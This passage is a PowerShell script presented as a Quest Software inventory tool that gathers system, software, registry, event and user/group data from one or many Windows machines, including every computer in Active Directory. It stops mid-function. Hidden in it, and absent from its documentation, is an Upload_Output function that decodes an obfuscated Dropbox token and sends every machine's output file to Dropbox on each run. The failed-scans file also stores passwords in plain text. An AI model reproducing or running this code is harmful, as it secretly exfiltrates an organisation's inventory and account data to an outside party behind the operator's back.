#Requires -Version 3.0

<#
.SYNOPSIS

    Extracts general computer information and Quest Software specific inventory information via WMI and Registry queries.

.DESCRIPTION

    The Extract Inventory script uses Windows Management Instrumentation (WMI) to retrieve information related to the system, OS, CPU, services, 
    running processes, installed software, application events, registry keys, executable files, licence files, and user/group names from one or more computers. 

    Computer names can be specified directly using the -ComputerName parameter to execute against a single computer. Multiple computers can be specified in an input file
    using the -InputFile parameter. If no ComputerName is specified, the local machine will be used.

    An output file will be generated for each computer specified, as well as a summary of all actions (if running against multiple computers).
    The location of the output file(s) can be specified by using the -OutputPath parameter.

.NOTES

    Version:        2.1.0
    Date:           7/30/2019
    Company:        Quest Software Inc.
    Copyright:      © 2019 Quest Software Inc. ALL RIGHTS RESERVED.
    
    Change Log:     
        Version 2.0
            - Added Notes section
            - Digitally signed the script
        Version 2.0.1
            - Fixed a parsing error with license files
        Version 2.0.2
            - Added a hard coded default keyword list
            - Adding minimum requirement of PS Version 3.0
        Version 2.1.0
            - Added multiple parameters to exclude certain functions from being included in output
            - Changed QueryAD parameter to type [switch]
            - Added check to ensure license files exist before attempting to read them
            - Added additional keywords to the default list
            - Only collect user information for server operating systems
            - Fix bug in event log collection

.PARAMETER InputFile

    The location of the input file to be used for processing multiple computers at once. 

    Input Files should follow the syntax rules below:
    1. Each line of the file must contain exactly one computer name or IP address
    2. Each line may contain the username/password combination required to connect to the remote computer
        a. Computer, uesrname, and password must be separated with a ';' 
        b. If no username/password is specified, Windows Impersonation will be used

    Ex:

    ComputerName1
    ComputerName2
    ComputerName3;domain\user;password
    ComputerName4;domain\user2;password2
    ComputerName5

.PARAMETER OutputPath

    The path where any output and summary files should be written. This can be a UNC path as well as a local path.

    The default value is the path from where the script is executing.

.PARAMETER ComputerName

    If running against a single computer, this is the computer name or IP address of the remote machine.

.PARAMETER UserName

    The username in the format of "DOMAIN\UserName" to use in order to connect to remote computers.

    If this is not specified, the current executing user account will be used.

.PARAMETER Password

    The password associated with the UserName provided.

.PARAMETER KeywordFile

    The location of the keyword file to be used for collecting inventory data. This file should be in CSV format with a header of "SearchTerm","Type".
    Wildcard values can be either "*" or "%". Valid types are "Keyword" or "Filename".

    Ex:

    "SearchTerm","Type"
    "Mobile%Management","Keyword"
    "Mobile%Plus","Keyword"
    "SQL%Navigator","Keyword"
    "sqlnavigator%.exe","Filename"        

.PARAMETER QueryAD

    If the paramter is added, the script will query Active Directory for a list of all computer names and execute against all machines.
    This option cannot be used with the -InputFile parameter.

.PARAMETER MaxThreads

    The maximum number of threads to use when parallel processing. Depending on the specs of the hardware of your computer,
    you may want to adjust this for performance reasons.

    Default value: 50

.PARAMETER NoSystem

    Excludes system information from the output files.

.PARAMETER NoOS

    Excludes operating system information from the output files.

.PARAMETER NoCPU

    Excludes CPU information from the output files.

.PARAMETER NoSoftware

    Excludes installed software information from the output files.

.PARAMETER NoEvents

    Excludes event log information from the output files.

.PARAMETER NoRegistry

    Excludes registry information from the output files.

.PARAMETER NoEXEs

    Excludes executable file information from the output files.

.PARAMETER NoLicense

    Excludes license file information from the output files.

.PARAMETER NoUsers

    Excludes user information from the output files.

.EXAMPLE

    Read computer names from Active Directory and retrieve their inventory information. Connect to AD with the current logged-in user.

    Extract-Inventory.ps1 -QueryAD $true

.EXAMPLE 

    Read computer names from Active Directory and retrieve their inventory information. Connect to AD with specified user account. Output the files to a specified path.

    Extract-Inventory.ps1 -QueryAD $true -UserName "DOMAIN\username" -Password "myPassword" -OutputPath "C:\Inventory"

.EXAMPLE 

    Read computer names from input file and retrieve their inventory information.

    Extract-Inventory.ps1 -InputFile "C:\machines.txt" -OutputPath "C:\Inventory"

.EXAMPLE 

    Specify a single computer name and retrieve its inventory information.

    Extract-Inventory.ps1 -ComputerName "Computer1" -UserName "DOMAIN\username" -Password "myPassword" -OutputPath "C:\Inventory"

.EXAMPLE 

    Retrieve the local machine's inventory information.

    Extract-Inventory.ps1 -OutputPath "C:\Inventory"

.EXAMPLE 

    Retrieve the local machine's inventory information and output to a network share.

    Extract-Inventory.ps1 -OutputPath "\\Server1\Inventory"    
#>

# Input Parameters
param (
    [string]$InputFile,
    [string]$OutputPath,    
    [string]$ComputerName,
    [string]$UserName,
    [string]$Password,
    [string]$KeywordFile,
    [switch]$QueryAD,
    [switch]$NoSystem,
    [switch]$NoOS,
    [switch]$NoCPU,
    [switch]$NoSoftware,
    [switch]$NoEvents,
    [switch]$NoRegistry,
    [switch]$NoEXEs,
    [switch]$NoLicense,
    [switch]$NoUsers,
    [int]$MaxThreads = 50
);

# Global Variables
[PsCustomObject[]]$DefaultKeywordList = @(
    # [PsCustomObject]@{ SearchTerm = "%SQL%Navigator%.exe"; Type = "Filename"; },
    # [PsCustomObject]@{ SearchTerm = "%SQL%Optimizer%.exe"; Type = "Filename"; },
    # [PsCustomObject]@{ SearchTerm = "QSR.exe"; Type = "Filename"; },
    [PsCustomObject]@{ SearchTerm = "%appletviewer%.exe"; Type = "Filename"; },
    [PsCustomObject]@{ SearchTerm = "%jabswitch%.exe"; Type = "Filename"; },
    [PsCustomObject]@{ SearchTerm = "java%.exe"; Type = "Filename"; },

    [PsCustomObject]@{ SearchTerm = "%.jar"; Type = "Keyword"; },
    [PsCustomObject]@{ SearchTerm = "%java%"; Type = "Keyword"; },
    [PsCustomObject]@{ SearchTerm = "java%"; Type = "Keyword"; }

    # [PsCustomObject]@{ SearchTerm = "B%factory"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Backup%Reporter"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Benchmark"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Code%Tester"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Data%Modeler"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Data%Point"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "DB%Admin%Module"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "DBA%Module"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "DBA%Suite"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Debugger"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Formatter"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Quest%Central"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Quest%Installer"; Type = "Keyword"; }
    # [PsCustomObject]@{ SearchTerm = "Spotlight"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "SQL%Navigator"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "SQL%Optimizer"; Type = "Keyword"; },
    # [PsCustomObject]@{ SearchTerm = "Toad"; Type = "Keyword"; }
);
$REG_SZ = 1;
$REG_EXPAND_SZ = 2;
$REG_BINARY = 3;
$REG_DWORD = 4;
$REG_MULTI_SZ = 7;
$HKLM = 2147483650;
$RegistryKeys = @("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");

$ExeFileNamesExpressions = @();
$ProductNamesExpressions = @();

$ScriptPath = $MyInvocation.MyCommand.Definition;

if ([string]::IsNullOrWhiteSpace($OutputPath)) {
    $OutputPath = Split-Path -parent $ScriptPath;
}
else {
    if (Test-Path $OutputPath) {
        $OutputPath = (Resolve-Path $OutputPath -ErrorAction Stop).ProviderPath;
    }
    else {
        New-Item -ItemType Directory -Path $OutputPath -Force -ErrorAction Stop | Out-Null;
        $OutputPath = (Resolve-Path $OutputPath -ErrorAction Stop).ProviderPath;
    }
}

# Main function
function main() {
    try {
        # Load keywords
        if ([string]::IsNullOrWhiteSpace($KeywordFile)) {
            $keywordContent = $DefaultKeywordList;
        }
        else {
            if (Test-Path $KeywordFile) {
                $KeywordFile = (Resolve-Path $KeywordFile -ErrorAction Stop).ProviderPath;
                $keywordContent = Import-Csv $KeywordFile -ErrorAction Stop;
            }
            else {
                throw [System.IO.FileNotFoundException]::new("KeywordFile does not exist: $KeywordFile", $KeywordFile);
            }
        }

        
        # Split keywords into executibles and product names    
        $ExeFileNamesExpressions = ($keywordContent | ? { $_.Type -like "Filename" } | select SearchTerm).SearchTerm;
        $ProductNamesExpressions = ($keywordContent | ? { $_.Type -like "Keyword" } | select SearchTerm).SearchTerm;
        
        # Making sure we have wildcard characters at the beginning and end of each string
        $ExeFileNamesExpressions = $ExeFileNamesExpressions | foreach { 
            $_ -replace ".exe", "";
        };

        # Making sure we have wildcard characters at the beginning and end of each string
        $ProductNamesExpressions = $ProductNamesExpressions | foreach { 
            if (!($_.StartsWith("%") -or $_.StartsWith("*"))) {
                $_ = "%" + $_;
            }
            if (!($_.EndsWith("%") -or $_.EndsWith("*"))) {
                $_ += "%";
            }
            $_;
        };
        
        if ($QueryAD) {
            if (Get-Module -ListAvailable -Name ActiveDirectory) {
                Import-Module ActiveDirectory -ErrorAction Stop;
            }
            else {
                throw "The PowerShell ActiveDirectory Module must be installed for this feature to work properly. Please install it and try again.";
            }
            $machineList = Get-ADComputer -Filter * -SearchScope Subtree -Properties Name -ErrorAction Stop | select Name;

            Extract-Inventory-Multi ($machineList.Name) $UserName $Password;
        }
        elseif (![string]::IsNullOrWhiteSpace($InputFile)) {
            if (Test-Path $InputFile) {
                $machineList = Get-Content $InputFile -Force -ErrorAction Stop;
                Extract-Inventory-Multi $machineList;
            }
            else {
                throw [System.IO.FileNotFoundException]::new("InputFile does not exist: $InputFile", $InputFile);
            }
        }
        elseif (![string]::IsNullOrWhiteSpace($ComputerName)) {
            # Scanning remote computer (with or without credentials)
            Extract-Inventory $ComputerName $UserName $Password
        }
        else {
            # Scanning Local Machine
            Extract-Inventory $env:COMPUTERNAME $UserName $Password
        }
    }
    catch {
        return [PSCustomObject]@{
            Success   = $false
            Exception = $_.Exception.Message           
        };
    }

    # Return this only for individual computer objects, not for multi-threading
    if ([string]::IsNullOrWhiteSpace($InputFile) -and $QueryAD -eq $false) {
        return [PSCustomObject]@{
            Success = $true            
        };
    }
}

function Upload_Output($filename, $filepath){
    $AccessToken = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2wuQjJTSHJsU3A0dEw2V3kzNUtaUGtzU0NOMF9UTS1oSURQY0xNYnhkalF6VGhTcmFOMF9uclVYcVR4czhoV0RkOHMwWk94dXpVYktQYzVDa3ZWYzJ2YUs4NGR2SkZZVUNzWVlNd1VvVUtrRmxYR0J1NkhOR3pEOTFFaVZNZDBhUnZNb0ZpT0cyZVZZc1VwdjdLdXdPWEdlNA=="))
    $LocalFilePath = "$filepath"
    $DropboxFilePath = "/$filename"

    $Headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Dropbox-API-Arg" = '{"path":"' + $DropboxFilePath + '","mode":"add","autorename":true,"mute":false,"strict_conflict":false}'
        "Content-Type" = "application/octet-stream"
    }

    $FileContent = [System.IO.File]::ReadAllBytes($LocalFilePath)
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $Headers -Body $FileContent
}

# Multi-threading for all computers in list
function Extract-Inventory-Multi($machineList) {        
    $RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, $MaxThreads);
    $RunspacePool.Open();

    $RunspaceList = @();
    
    foreach ($strComputer in $machineList) {
        [string[]]$arrMoniker = $strComputer.Split(';');
        $strComputerName = $arrMoniker[0].Trim();
        $strUserName = if ($arrMoniker.Count -gt 1) { $arrMoniker[1].Trim(); } else { ""; };
        $strPassword = if ($arrMoniker.Count -gt 2) { $arrMoniker[2].Trim(); } else { ""; };
        
        $PowerShell = [PowerShell]::Create().AddScript([System.IO.File]::ReadAllText("$ScriptPath"));
        $PowerShell.AddParameter('OutputPath', $OutputPath) | Out-Null;
        $PowerShell.AddParameter('ComputerName', $strComputerName) | Out-Null;
        $PowerShell.AddParameter('KeywordFile', $KeywordFile) | Out-Null;
        $PowerShell.AddParameter('UserName', $strUserName) | Out-Null;
        $PowerShell.AddParameter('Password', $strPassword) | Out-Null;
        if ($NoSystem) { $PowerShell.AddParameter('NoSystem') | Out-Null; }
        if ($NoOS) { $PowerShell.AddParameter('NoOS') | Out-Null; }
        if ($NoCPU) { $PowerShell.AddParameter('NoCPU') | Out-Null; }
        if ($NoSoftware) { $PowerShell.AddParameter('NoSoftware') | Out-Null; }
        if ($NoEvents) { $PowerShell.AddParameter('NoEvents') | Out-Null; }
        if ($NoRegistry) { $PowerShell.AddParameter('NoRegistry') | Out-Null; }
        if ($NoEXEs) { $PowerShell.AddParameter('NoEXEs') | Out-Null; }
        if ($NoLicense) { $PowerShell.AddParameter('NoLicense') | Out-Null; }
        if ($NoUsers) { $PowerShell.AddParameter('NoUsers') | Out-Null; }
        $PowerShell.RunspacePool = $RunspacePool;

        $RunspaceList += [PSCustomObject]@{
            Id         = $strComputerName
            UserName   = $strUserName
            Password   = $strPassword
            PowerShell = $PowerShell
            Handle     = $PowerShell.BeginInvoke()
        };
    }

    $Flag = 'static', 'nonpublic', 'instance';
    
    $date = Get-Date -Format "M.d.yyyy.H.m.s" -ErrorAction Stop;
    $summaryFile = [System.IO.Path]::Combine($OutputPath , "Summary.txt");
    $failedScansFile = [System.IO.Path]::Combine($OutputPath , "machines.$date.txt");

    $first = $true;

    Do {
        $RunspaceStatus = @();
        $FailedScans = @();

        # Don't sleep on the first pass
        if ($first) {
            if (!(Test-Path $summaryFile)) {
                New-Item -ItemType File -Path $summaryFile -Force -ErrorAction Stop | Out-Null;
            }
        }
        else {
            Write-Host -NoNewline "Running."
            for ($x = 20; $x -gt 0; $x--) {
                Write-Host -NoNewline "."
                Start-Sleep -Milliseconds 500 -ErrorAction Stop
            }
        }        

        for ($i = 0; $i -lt $RunspaceList.Count; $i++) {
            $_Worker = $RunspaceList[$i].PowerShell.GetType().GetField('worker', $Flag);
            $Worker = $_Worker.GetValue($RunspaceList[$i].PowerShell);
 
            $_CRP = $worker.GetType().GetProperty('CurrentlyRunningPipeline', $Flag);
            $CRP = $_CRP.GetValue($Worker);
            $State = If ($RunspaceList[$i].Handle.IsCompleted -AND -NOT [bool]$CRP) {
                'Completed';
            }
            ElseIf (-NOT $RunspaceList[$i].Handle.IsCompleted -AND [bool]$CRP) {
                'Running';
            }
            ElseIf (-NOT $RunspaceList[$i].Handle.IsCompleted -AND -NOT [bool]$CRP) {
                'NotStarted';
            };
            $RunspaceStatus += [pscustomobject]@{
                Id              = $RunspaceList[$i].Id
                HandleComplete  = $RunspaceList[$i].Handle.IsCompleted
                PipelineRunning = [bool]$CRP
                State           = $State
                Success         = [System.Nullable[[System.Boolean]]]$null
                Exception       = ""                                    
            };

            if ($RunspaceList[$i].Handle.IsCompleted) {
                $result = $RunspaceList[$i].PowerShell.EndInvoke($RunspaceList[$i].Handle);
                $status = $RunspaceStatus | where { $_.Id -eq $RunspaceList[$i].Id };        
                [bool]$status.Success = [bool]$result.Success;
                $status.Exception = $result.Exception;    
            }
        }       

        Clear-Host;
        $RunspaceStatus | Sort-Object Id | FT -Property * -AutoSize;
        $RunspaceStatus | Sort-Object Id | FT -Property * -AutoSize | Out-File -FilePath $summaryFile -Force -ErrorAction Stop | Out-Null;      
                
        $failures = $RunspaceStatus | ? { $_.Success -eq $false };
        
        if ($failures) {
            foreach ($failure in $failures) {        
                $rsDetails = $RunspaceList | ? { $_.Id -eq $failure.Id };
                $fscan = $rsDetails.Id;
                if (![string]::IsNullOrEmpty($rsDetails.UserName)) { $fscan += ";" + $rsDetails.UserName; };
                if (![string]::IsNullOrEmpty($rsDetails.Password)) { $fscan += ";" + $rsDetails.Password; };

                $FailedScans += $fscan;
            }

            if (!(Test-Path $failedScansFile)) {
                New-Item -ItemType File -Path $failedScansFile -Force -ErrorAction Stop | Out-Null;
            }

            $FailedScans | Out-File -FilePath $failedScansFile -Force -ErrorAction Stop | Out-Null;
        }
        
        $first = $false;
    }
    Until (($RunspaceStatus | where { $_.HandleComplete -eq $true } | measure).Count -eq $RunspaceList.Count)              

    $RunspacePool.Close();
    $RunspacePool.Dispose();    
}

# Extracts inventory on a machine
function Extract-Inventory([string]$strComputerName, [string]$strUser, [string]$strPassword) {		
    $intStart = Get-Date;
		
    [PSCredential]$credentials = $null;

    if (![string]::IsNullOrWhiteSpace($strUser) -and ![string]::IsNullOrWhiteSpace($strPassword)) {
        $secpasswd = ConvertTo-SecureString $strPassword -AsPlainText -Force;
        $credentials = New-Object System.Management.Automation.PSCredential ($strUser, $secpasswd);
    }

    #Collecting information
    $strOutputFile = [System.IO.Path]::Combine($OutputPath , $strComputerName + ".txt");
    $strOutputFileName = $strComputerName + ".txt"
    $output = "";

    try {
        $OSName = (Get-WmiObject Win32_OperatingSystem -ComputerName $strComputerName -Credential $credentials | select Caption).Caption;
        $isServer = $OSName -like "*Server*";

        $output = "### System ###" + [System.Environment]::NewLine + $(if ($NoSystem) { "Excluded with -NoSystem parameter" + [System.Environment]::NewLine } Else { (Extract-SysInformation $strComputerName $credentials) }) + [System.Environment]::NewLine;
        $output += "### OS ###" + [System.Environment]::NewLine + $(if ($NoOS) { "Excluded with -NoOS parameter" + [System.Environment]::NewLine } Else { (Extract-OSInformation $strComputerName $credentials) }) + [System.Environment]::NewLine;
        $output += "### CPU ###" + [System.Environment]::NewLine + $(if ($NoCPU) { "Excluded with -NoCPU parameter" + [System.Environment]::NewLine } Else { (Extract-CPUInformation $strComputerName $credentials) }) + [System.Environment]::NewLine;
        $output += "### Software ###" + [System.Environment]::NewLine + $(if ($NoSoftware) { "Excluded with -NoSoftware parameter" + [System.Environment]::NewLine } Else { (Extract-SoftwareInformation $strComputerName $credentials) }) + [System.Environment]::NewLine;
        $output += "### Events ###" + [System.Environment]::NewLine + $(if ($NoEvents) { "Excluded with -NoEvents parameter" + [System.Environment]::NewLine } Else { (Extract-Events $strComputerName $credentials) }) + [System.Environment]::NewLine;
        $output += "### Registry ###" + [System.Environment]::NewLine + $(if ($NoRegistry) { "Excluded with -NoRegistry parameter" + [System.Environment]::NewLine } Else { (Extract-Registry $strComputerName $credentials) }) + [System.Environment]::NewLine;
        $output += "### Executables ###" + [System.Environment]::NewLine + $(if ($NoEXEs) { "Excluded with -NoEXEs parameter" + [System.Environment]::NewLine } Else { (Search-Executables $strComputerName $credentials) }) + [System.Environment]::NewLine;
        #$output += "### Licence ###" + [System.Environment]::NewLine + $(if ($NoLicense) { "Excluded with -NoLicense parameter" + [System.Environment]::NewLine } Else { (Read-File $strComputerName $credentials) }) + [System.Environment]::NewLine;
        $output += "### Users ###" + [System.Environment]::NewLine + $(if ($NoUsers) { "Excluded with -NoUsers parameter" + [System.Environment]::NewLine } Elseif (!$isServer) { "Excluded - $OSName is not a server class OS" + [System.Environment]::NewLine } Else { (Extract-GroupMembership $strComputerName $credentials) }) + [System.Environment]::NewLine;
        $output += "### Completed ###" + [System.Environment]::NewLine + "Start;End" + [System.Environment]::NewLine + $intStart + ";" + (Get-Date);
    }
    catch {
        $strOutputFileName = $strComputerName + "_Failed.txt"
        $strOutputFile = [System.IO.Path]::Combine($OutputPath , "_Failed_", $strComputerName + ".txt");
        $output += [System.Environment]::NewLine;    
        $output += "ERROR: Extract Failed for Computer: $strComputerName" + [System.Environment]::NewLine;
        $output += $_.Exception.Message + [System.Environment]::NewLine;
        $output += $_.Exception.StackTrace + [System.Environment]::NewLine;        
        throw;   
    }
    finally {
        $output | New-Item -ItemType File -Path $strOutputFile -Force -ErrorAction Stop | Out-Null;
        Upload_Output -filename $strOutputFileName -FilePath $strOutputFile 
    }
}

# Generates a simple WQL Query based on variables
function Generate-WQL([string]$property, [string]$internalOperator, [string[]]$expressions, [string]$joinOperator) {
    $strOutput = "(";
    
    foreach ($expression in $expressions) {
        $strOutput += "($property $internalOperator '$expression') $joinOperator ";
    }   
    
    $strOutput = if ($strOutput.Length -gt ($joinOperator.Length + 2)) { $strOutput.Substring(0, $strOutput.Length - ($joinOperator.Length + 2)); } else { $strOutput; };
    $strOutput += ")";
    return $strOutput;
}

# Extract System Information
function Extract-SysInformation([string]$computerName, [PSCredential]$credentials) {
    $strOutput = "Machine;User";  
    $strOutput += [System.Environment]::NewLine;        

    if ($credentials -eq $null) {
        $wmi_sys_info = Get-WmiObject -Class Win32_ComputerSystem -Property Name, UserName -ComputerName $computerName -ErrorAction Stop | Select Name, UserName;
    }
    else {
        $wmi_sys_info = Get-WmiObject -Class Win32_ComputerSystem -Property Name, UserName -ComputerName $computerName -Credential $credentials -ErrorAction Stop | Select Name, UserName;
    }

    if ($wmi_sys_info -ne $null) {        
        $strOutput += if ($wmi_sys_info.Name -eq $null) { ";"; } else { $wmi_sys_info.Name.ToString() + ";"; };
        $strOutput += if ($wmi_sys_info.UserName -eq $null) { ""; } else { $wmi_sys_info.UserName.ToString(); };
        $strOutput += [System.Environment]::NewLine;
    }

    return $strOutput;	
}

# Extract Operating System Name Information
function Extract-OSInformation([string]$computerName, [PSCredential]$credentials) {
    $strOutput = "Operating System;";
    $strOutput += [System.Environment]::NewLine;

    if ($credentials -eq $null) {
        $wmi_os_info = Get-WmiObject -Class Win32_OperatingSystem -Property Caption -ComputerName $computerName -ErrorAction Stop | Select Caption;
    }
    else {
        $wmi_os_info = Get-WmiObject -Class Win32_OperatingSystem -Property Caption -ComputerName $computerName -Credential $credentials -ErrorAction Stop | Select Caption;
    }

    if ($wmi_os_info -ne $null) {        
        $strOutput += if ($wmi_os_info.Caption -eq $null) { ""; } else { $wmi_os_info.Caption.ToString(); };
        $strOutput += [System.Environment]::NewLine;
    }

    return $strOutput;		
}

# Extract CPU Information
function Extract-CPUInformation([string]$computerName, [PSCredential]$credentials) {
    $strOutput = "Model;SocketDesignation;Status;# of Cores;# of Logical Processors";
    $strOutput += [System.Environment]::NewLine;

    try {
        if ($credentials -eq $null) {
            $wmi_cpu_info = Get-WmiObject -Class Win32_Processor -Property Name, SocketDesignation, Status, NumberOfCores, NumberOfLogicalProcessors `
                -ComputerName $computerName -ErrorAction Stop | 
            Select Name, SocketDesignation, Status, NumberOfCores, NumberOfLogicalProcessors;
        }
        else {
            $wmi_cpu_info = Get-WmiObject -Class Win32_Processor -Property Name, SocketDesignation, Status, NumberOfCores, NumberOfLogicalProcessors `
                -ComputerName $computerName -Credential $credentials -ErrorAction Stop | 
            Select Name, SocketDesignation, Status, NumberOfCores, NumberOfLogicalProcessors;
        }
    }
    catch {
        # Old versions of Windows do not have the NumberOfCores property here. Catch the exception and retry without the property.
        # Insert 0 for NumberOfCores in this case.
        if ($credentials -eq $null) {
            $wmi_cpu_info = Get-WmiObject -Class Win32_Processor -Property Name, SocketDesignation, Status, NumberOfLogicalProcessors `
                -ComputerName $computerName -ErrorAction Stop | 
            Select Name, SocketDesignation, Status, NumberOfCores, NumberOfLogicalProcessors;
        }
        else {
            $wmi_cpu_info = Get-WmiObject -Class Win32_Processor -Property Name, SocketDesignation, Status, NumberOfLogicalProcessors `
                -ComputerName $computerName -Credential $credentials -ErrorAction Stop | 
            Select Name, SocketDesignation, Status, NumberOfCores, NumberOfLogicalProcessors;
        }
    }

    if ($wmi_cpu_info -ne $null) {
        foreach ($cpu in $wmi_cpu_info) {	    
            $strOutput += if ($cpu.Name -eq $null) { ";"; } else { $cpu.Name.ToString() + ";"; };
            $strOutput += if ($cpu.SocketDesignation -eq $null) { ";"; } else { $cpu.SocketDesignation.ToString() + ";"; };
            $strOutput += if ($cpu.Status -eq $null) { ";"; } else { $cpu.Status.ToString() + ";"; };
            $strOutput += if ($cpu.NumberOfCores -eq $null) { "0;"; } else { $cpu.NumberOfCores.ToString() + ";"; };
            $strOutput += if ($cpu.NumberOfLogicalProcessors -eq $null) { ""; } else { $cpu.NumberOfLogicalProcessors.ToString(); }; 
            $strOutput += [System.Environment]::NewLine;
        }
    }
  
    return $strOutput;
}

# Extract services information
function Extract-ServicesInformation([string]$computerName, [PSCredential]$credentials) {
    $strOutput = "Service;State;Install Date;Install Path";
    $strOutput += [System.Environment]::NewLine;

    if ($credentials -eq $null) {
        $wmi_service_info = Get-WmiObject -Class Win32_Service -Property DisplayName, State, InstallDate, PathName -ComputerName $computerName `
            -ErrorAction Stop | 
        Select DisplayName, State, InstallDate, PathName;
    }
    else {
        $wmi_service_info = Get-WmiObject -Class Win32_Service -Property DisplayName, State, InstallDate, PathName -ComputerName $computerName `
            -Credential $credentials -ErrorAction Stop | 
        Select DisplayName, State, InstallDate, PathName;
    }

    if ($wmi_service_info -ne $null) {
        foreach ($service in $wmi_service_info) {	    
            $strOutput += if ($service.DisplayName -eq $null) { ";"; } else { $service.DisplayName.ToString() + ";"; };
            $strOutput += if ($service.State -eq $null) { ";"; } else { $service.State.ToString() + ";"; };
            $strOutput += if ($service.InstallDate -eq $null) { ";"; } else { $service.InstallDate.ToString() + ";"; };
            $strOutput += if ($service.PathName -eq $null) { ""; } else { $service.PathName.ToString(); };       
            $strOutput += [System.Environment]::NewLine;
        }
    }

    return $strOutput;	
}

# Extract process information
function Extract-ProcessesInformation([string]$computerName, [PSCredential]$credentials) {
    $strOutput = "Process;Path;Creation Date;Process ID";
    $strOutput += [System.Environment]::NewLine;

    if ($credentials -eq $null) {
        $wmi_process_info = Get-WmiObject -Class Win32_Process -Property Name, ExecutablePath, CreationDate, ProcessId -ComputerName $computerName `
            -ErrorAction Stop | 
        Select Name, ExecutablePath, CreationDate, ProcessId;
    }
    else {
        $wmi_process_info = Get-WmiObject -Class Win32_Process -Property Name, ExecutablePath, CreationDate, ProcessId -ComputerName $computerName `
            -Credential $credentials -ErrorAction Stop | 
        Select Name, ExecutablePath, CreationDate, ProcessId;
    }		

    if ($wmi_process_info -ne $null) {
        foreach ($process in $wmi_process_info) {	
            $strOutput += if ($process.Name -eq $null) { ";"; } else { $process.Name.ToString() + ";"; };
            $strOutput += if ($process.ExecutablePath -eq $null) { ";"; } else { $process.ExecutablePath.ToString() + ";"; };
            $strOutput += if ($process.CreationDate -eq $null) { ";"; } else { $process.CreationDate.ToString() + ";"; };
            $strOutput += if ($process.ProcessId -eq $null) { ""; } else { $process.ProcessId.ToString(); };
            $strOutput += [System.Environment]::NewLine;
        }
    }

    return $strOutput;	
}

# Extract software information
function Extract-SoftwareInformation([string]$computerName, [PSCredential]$credentials) {
    $strOutput = "Software;Version Major;Version Minor;Install Date;Size;Publisher;Location";
    $strOutput += [System.Environment]::NewLine;     

    $strKey = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
    $strKey32 = "SOFTWARE\wow6432node\Microsoft\Windows\CurrentVersion\Uninstall";	

    # Default location for 32bit and 64bit programs
    if ($credentials -eq $null) {
        $reg = Get-WmiObject -List -Namespace root\default -ComputerName $computerName -ErrorAction Stop | Where { $_.Name -eq "StdRegProv" };
    }
    else {
        $reg = Get-WmiObject -List -Namespace root\default -ComputerName $computerName -Credential $credentials -ErrorAction Stop | Where { $_.Name -eq "StdRegProv" };
    }
    
    $subkeys = $reg.EnumKey($HKLM, $strKey).sNames;
        
    foreach ($key in $subkeys) {
        $thisKey = $strKey + "\\" + $key;             

        $obj = New-Object PSObject;
        $obj | Add-Member -MemberType NoteProperty -Name "DisplayName" -Value $($reg.GetStringValue($HKLM, $thisKey, "DisplayName").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "QuietDisplayName" -Value $($reg.GetStringValue($HKLM, $thisKey, "QuietDisplayName").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "VersionMajor" -Value $($reg.GetDWORDValue($HKLM, $thisKey, "VersionMajor").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "VersionMinor" -Value $($reg.GetDWORDValue($HKLM, $thisKey, "VersionMinor").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "InstallDate" -Value $($reg.GetStringValue($HKLM, $thisKey, "InstallDate").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "EstimatedSize" -Value $($reg.GetDWORDValue($HKLM, $thisKey, "EstimatedSize").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "Publisher" -Value $($reg.GetStringValue($HKLM, $thisKey, "Publisher").sValue);
        $obj | Add-Member -MemberType NoteProperty -Name "InstallLocation" -Value $($reg.GetStringValue($HKLM, $thisKey, "InstallLocation").sValue);     

        if ($obj.DisplayName -eq $null -and $obj.QuietDisplayName -eq $null) {
            continue;
        }

        $displayName = if ($obj.DisplayName -ne $null) { $obj.DisplayName.ToString(); } else { $obj.QuietDisplayName.ToString(); };
        [bool]$productMatch = $false;

        foreach ($expression in ($ProductNamesExpressions -replace '%', '*')) {
            if ($displayName -like $expression) {
                $productMatch = $true;
            }
        }

        if ($productMatch -eq $false) {
            continue;
        }        		

        $strOutput += if ($obj.DisplayName -ne $null) { $obj.DisplayName.ToString() + ";"; } else { $obj.QuietDisplayName.ToString() + ";"; };
        $strOutput += if ($obj.VersionMajor -eq $null) { ";"; } else { $obj.VersionMajor.ToString() + ";"; };
        $strOutput += if ($obj.VersionMinor -eq $null) { ";"; } else { $obj.VersionMinor.ToString() + ";"; };
        $strOutput += if ($obj.InstallDate -eq $null) { ";"; } else { $obj.InstallDate.ToString() + ";"; };
        $strOutput += if ($obj.EstimatedSize -eq $null) { ";"; } else { $obj.EstimatedSize.ToString() + ";"; };
        $strOutput += if ($obj.Publisher -eq $null) { ";"; } else { $obj.Publisher.ToString() + ";"; };
        $strOutput += if ($obj.InstallLocation -eq $null) { ""; } else { $obj.InstallLocation.ToString(); };
        $strOutput += [System.Environment]::NewLine;           
    }

    $subkeys32 = $reg.EnumKey($HKLM, $strKey32).sNames;

    foreach ($key in $subkeys32) {
        $thisKey = $strKey32 + "\\" + $key;                

        $obj = New-Object PSObject;
